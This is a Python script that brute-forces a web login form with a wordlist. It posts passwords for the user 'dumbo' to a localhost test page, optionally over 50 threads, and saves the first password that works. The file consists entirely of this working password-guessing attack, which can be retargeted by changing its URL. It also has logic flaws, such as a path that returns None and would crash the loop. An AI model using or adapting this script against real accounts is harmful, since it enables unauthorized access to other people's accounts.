import requests
import random
from threading import Thread
import os

url = "https://localhost/password_crack_test/login.php"
username = 'dumbo'

def send_request(password):
    used_words= open("used_words.txt","r")
    finished = open("finished.txt","r")
    if "Done" in finished:
        quit()
    if password not in used_words:
        used_words.close()
        used_words =open("used_words.txt","a")
        used_words.write(password)
        used_words.close()
        data = {
            "username" : "dumbo",
            "password" : password
        }
        #print(password)
        r = requests.post(url, data = data, verify = False)
        return r

headers = {"Content-Type": "application/json; charset=utf-8"}
wordlist = open("common.txt","r")
open('used_words.txt', 'w').close()
open('finished.txt', 'w').close()
def main():
    for i in wordlist:
        r = send_request(i)
        if "please fill in your credentials to login" not in r.text.lower():
            

            print("Password is ",i)
            finished = open("finished.txt","w")
            finished.write("Done")
            finished.close()
            pasfile = open("result.txt","w")
            pasfile.write("Password is: "+i)
            quit()
            break
# for x in range(50):
#     Thread(target=main).start()
main()

